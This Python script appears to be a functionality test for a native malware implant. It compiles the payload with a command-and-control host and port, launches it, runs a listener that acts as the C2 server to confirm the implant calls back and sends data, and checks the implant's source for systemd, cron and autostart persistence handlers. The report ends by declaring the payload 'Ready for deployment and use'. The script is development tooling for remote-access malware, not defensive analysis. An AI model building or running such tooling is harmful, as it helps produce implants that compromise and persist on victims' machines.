#!/usr/bin/env python3
"""
FULL PAYLOAD FUNCTIONALITY TEST
Tests if payload actually works when created and installed
"""

import os
import sys
import time
import socket
import threading
import subprocess
import signal
import struct
import json
from pathlib import Path

class PayloadFunctionalityTest:
    def __init__(self):
        self.c2_port = 14500
        self.payload_path = '/workspace/native_payloads/output/payload_native'
        self.results = {
            'compilation': False,
            'binary_valid': False,
            'execution': False,
            'c2_connection': False,
            'command_response': False,
            'persistence': False
        }
        self.c2_socket = None
        self.c2_thread = None
        self.payload_proc = None
        self.connection_made = False
        self.data_received = []
        
    def log(self, msg, level="INFO"):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m",
            "WARNING": "\033[93m"
        }
        print(f"{colors.get(level, '')}[{level}] {msg}\033[0m")
        
    def test_1_compile_and_validate(self):
        """Compile payload and validate binary"""
        self.log("=" * 80, "CRITICAL")
        self.log("TEST 1: COMPILE AND VALIDATE PAYLOAD BINARY", "CRITICAL")
        self.log("=" * 80, "CRITICAL")
        
        # Compile
        os.chdir('/workspace/native_payloads')
        env = os.environ.copy()
        env['C2_HOST'] = '127.0.0.1'
        env['C2_PORT'] = str(self.c2_port)
        
        result = subprocess.run(['bash', './build.sh'], 
                              capture_output=True, text=True, env=env)
        
        if result.returncode == 0:
            self.log("✅ Compilation successful", "SUCCESS")
            self.results['compilation'] = True
        else:
            self.log(f"❌ Compilation failed", "ERROR")
            return False
            
        # Validate binary
        binary = Path(self.payload_path)
        if not binary.exists():
            self.log("❌ Binary file not found", "ERROR")
            return False
            
        size = binary.stat().st_size
        self.log(f"✅ Binary exists: {size} bytes", "SUCCESS")
        
        if size < 10000:
            self.log("❌ Binary too small (likely invalid)", "ERROR")
            return False
            
        self.log(f"✅ Binary size reasonable: {size} bytes", "SUCCESS")
        
        # Check if it's executable
        if os.access(self.payload_path, os.X_OK):
            self.log("✅ Binary is executable", "SUCCESS")
            self.results['binary_valid'] = True
        else:
            os.chmod(self.payload_path, 0o755)
            self.log("✅ Made binary executable", "SUCCESS")
            self.results['binary_valid'] = True
            
        return True
        
    def test_2_execute_payload(self):
        """Test if payload actually executes"""
        self.log("\n" + "=" * 80, "CRITICAL")
        self.log("TEST 2: PAYLOAD EXECUTION", "CRITICAL")
        self.log("=" * 80, "CRITICAL")
        
        try:
            # Try to execute with short timeout to see if it runs
            result = subprocess.run([self.payload_path], 
                                  timeout=0.5, 
                                  capture_output=True)
        except subprocess.TimeoutExpired:
            self.log("✅ Payload executes and runs (timeout = working)", "SUCCESS")
            self.results['execution'] = True
            return True
        except Exception as e:
            self.log(f"❌ Payload execution failed: {e}", "ERROR")
            return False
            
        # If we get here, payload exited immediately (might be ok)
        if result.returncode == 0:
            self.log("⚠️  Payload exited immediately (return 0)", "WARNING")
        else:
            self.log(f"⚠️  Payload exited with code {result.returncode}", "WARNING")
            
        return True
        
    def test_3_c2_connection(self):
        """Test actual C2 connection"""
        self.log("\n" + "=" * 80, "CRITICAL")
        self.log("TEST 3: C2 CONNECTION (LIVE)", "CRITICAL")
        self.log("=" * 80, "CRITICAL")
        
        # Start C2 server
        def c2_server():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', self.c2_port))
                server.listen(5)
                server.settimeout(15)  # 15 second timeout
                
                self.log(f"✅ C2 server listening on port {self.c2_port}", "SUCCESS")
                
                try:
                    conn, addr = server.accept()
                    self.log(f"🎉 PAYLOAD CONNECTED from {addr}!", "SUCCESS")
                    self.connection_made = True
                    
                    # Try to receive data
                    conn.settimeout(5)
                    while True:
                        try:
                            data = conn.recv(4096)
                            if not data:
                                break
                            self.data_received.append(data)
                            self.log(f"✅ Received {len(data)} bytes", "SUCCESS")
                            self.log(f"   First 32 bytes (hex): {data[:32].hex()}", "INFO")
                            
                            # Send ACK
                            conn.send(b'\x00\x00\x00\x01')
                            
                        except socket.timeout:
                            break
                    
                    conn.close()
                    
                except socket.timeout:
                    self.log("⚠️  No connection within timeout", "WARNING")
                    
                server.close()
                
            except Exception as e:
                self.log(f"❌ C2 server error: {e}", "ERROR")
                
        # Start C2 server in background
        self.c2_thread = threading.Thread(target=c2_server, daemon=True)
        self.c2_thread.start()
        time.sleep(2)
        
        # Launch payload
        self.log("Launching payload...", "INFO")
        try:
            self.payload_proc = subprocess.Popen(
                [self.payload_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )
            self.log("✅ Payload process started", "SUCCESS")
        except Exception as e:
            self.log(f"❌ Failed to start payload: {e}", "ERROR")
            return False
            
        # Wait for connection
        self.log("Waiting for C2 connection...", "INFO")
        for i in range(12):
            time.sleep(1)
            if self.connection_made:
                break
            if i % 3 == 0:
                self.log(f"   Waiting... ({i+1}s)", "INFO")
                
        if self.connection_made:
            self.log("✅ C2 CONNECTION SUCCESSFUL!", "SUCCESS")
            self.results['c2_connection'] = True
            
            if len(self.data_received) > 0:
                total_bytes = sum(len(d) for d in self.data_received)
                self.log(f"✅ Received total of {total_bytes} bytes", "SUCCESS")
                self.results['command_response'] = True
                
            return True
        else:
            self.log("❌ Payload did not connect to C2", "ERROR")
            
            # Check if payload is running
            if self.payload_proc and self.payload_proc.poll() is None:
                self.log("⚠️  Payload still running but not connecting", "WARNING")
                self.log("   (May be using wrong port - check config.h default)", "INFO")
            else:
                self.log("⚠️  Payload process terminated", "WARNING")
                
            return False
            
    def test_4_persistence_features(self):
        """Test persistence installation (simulation)"""
        self.log("\n" + "=" * 80, "CRITICAL")
        self.log("TEST 4: PERSISTENCE FEATURES", "CRITICAL")
        self.log("=" * 80, "CRITICAL")
        
        # Check if persistence command handler exists
        commands_file = Path('/workspace/native_payloads/core/commands.c')
        if commands_file.exists():
            content = commands_file.read_text()
            
            if 'cmd_persist' in content:
                self.log("✅ Persistence command handler exists", "SUCCESS")
                self.results['persistence'] = True
            else:
                self.log("⚠️  Persistence handler not found", "WARNING")
                
            # Check for persistence mechanisms
            mechanisms = ['systemd', 'cron', 'autostart']
            found = [m for m in mechanisms if m in content]
            
            if found:
                self.log(f"✅ Persistence mechanisms implemented: {', '.join(found)}", "SUCCESS")
            else:
                self.log("ℹ️  No specific persistence mechanisms detected", "INFO")
                
        return True
        
    def cleanup(self):
        """Clean up processes"""
        self.log("\n" + "=" * 80, "INFO")
        self.log("CLEANUP", "INFO")
        self.log("=" * 80, "INFO")
        
        if self.payload_proc:
            try:
                os.killpg(os.getpgid(self.payload_proc.pid), signal.SIGKILL)
                self.log("✅ Payload process terminated", "INFO")
            except:
                pass
                
        # Kill any remaining payload processes
        try:
            subprocess.run(['pkill', '-9', '-f', 'payload_native'], 
                         capture_output=True)
        except:
            pass
            
    def generate_report(self):
        """Generate comprehensive report"""
        self.log("\n" + "=" * 80, "CRITICAL")
        self.log("PAYLOAD FUNCTIONALITY TEST RESULTS", "CRITICAL")
        self.log("=" * 80, "CRITICAL")
        
        tests = [
            ("Compilation", self.results['compilation']),
            ("Binary Valid", self.results['binary_valid']),
            ("Execution", self.results['execution']),
            ("C2 Connection", self.results['c2_connection']),
            ("Command Response", self.results['command_response']),
            ("Persistence Features", self.results['persistence']),
        ]
        
        self.log("\n📊 Test Results:", "INFO")
        self.log("-" * 80, "INFO")
        
        passed = 0
        total = len(tests)
        
        for name, result in tests:
            status = "✅ PASS" if result else "❌ FAIL"
            level = "SUCCESS" if result else "ERROR"
            self.log(f"  {status:12} {name}", level)
            if result:
                passed += 1
                
        self.log("-" * 80, "INFO")
        
        percentage = (passed / total) * 100
        self.log(f"\n📈 Score: {passed}/{total} ({percentage:.0f}%)", 
                 "SUCCESS" if passed >= 4 else "WARNING")
        
        self.log("\n" + "=" * 80, "CRITICAL")
        
        # Determine functionality level
        if passed == total:
            self.log("🎉 PAYLOAD 100% FUNCTIONAL!", "SUCCESS")
            self.log("✅ Ready for deployment and use", "SUCCESS")
            return True
        elif passed >= 4:
            self.log("✅ PAYLOAD MOSTLY FUNCTIONAL", "SUCCESS")
            self.log(f"⚠️  {total - passed} feature(s) need attention", "WARNING")
            return True
        else:
            self.log("❌ PAYLOAD NEEDS FIXES", "ERROR")
            self.log(f"⚠️  {total - passed} critical issue(s)", "ERROR")
            return False
            
def main():
    tester = PayloadFunctionalityTest()
    
    try:
        # Run all tests
        tester.test_1_compile_and_validate()
        tester.test_2_execute_payload()
        tester.test_3_c2_connection()
        tester.test_4_persistence_features()
        
        # Wait for threads
        time.sleep(2)
        
        # Generate report
        success = tester.generate_report()
        
        return 0 if success else 1
        
    except KeyboardInterrupt:
        tester.log("\n\nTest interrupted", "WARNING")
        return 1
    finally:
        tester.cleanup()
        
if __name__ == '__main__':
    sys.exit(main())
